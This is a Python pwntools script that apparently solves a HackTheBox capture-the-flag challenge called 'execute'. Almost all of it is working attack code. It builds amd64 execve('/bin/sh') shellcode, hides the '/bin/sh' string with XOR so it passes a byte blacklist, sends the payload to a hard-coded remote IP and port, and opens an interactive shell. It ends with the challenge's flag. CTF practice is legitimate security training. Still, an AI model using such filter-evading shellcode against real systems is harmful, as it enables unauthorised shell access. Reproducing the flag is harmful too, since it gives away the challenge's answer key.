from pwn import *
import time

# 60 bytes of wiggle room 
context.arch='amd64'
blacklist = b"\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67";
shellcode = [
#    'xor rbx, rbx', # ok 
#    'xor rdi, rdi', # ok
#    'mov rsi, 0',
#    'mov rdx, 0',
#    'xor ah, ah',
#    'add rdx, 59',
#    'mov [rsp+16], rbx',
#    'syscall',

    'mov rsi, 0',
    'mov rdx, 0',
    'mov al, 0',
    'add al, 58',
    'add al, 1',
    'mov rbx, 0x08132f0e09022f',
    'mov rcx, 0x60600060606000',
    'xor rbx, rcx',
    'push rbx',
    'mov rdi, rsp',
    'syscall'
]
""" /bin/sh = 62 69 6e 73 68  """
""" hs/nib/ = 68 73 2f 6e 69 62 2f  """

payload = b''
for i in range(len(shellcode)):
    s = asm(shellcode[i])
    h = s.hex()
    print("hex is: ", h, "for ", shellcode[i])
    for j in s:
        print(j)
        if (j in blacklist):
            print("Failed: ", hex(j))
        assert j not in blacklist
    payload += s
    print("-" * 10)
print(len(payload))

LOCAL = False
if LOCAL:
    r = process('./execute')
else:
    r = remote('94.237.57.173',47835)
""" f = open('./payload', 'wb') """
""" f.write(payload) """
""" f.close() """
""" gdb.attach(r) """
""" time.sleep(1) """
r.recvuntil("execute")
r.recvline()
r.send(payload)
r.interactive()
""""""
""""""
# flag: HTB{wr1t1ng_sh3llc0d3_1s_s0_c00l}



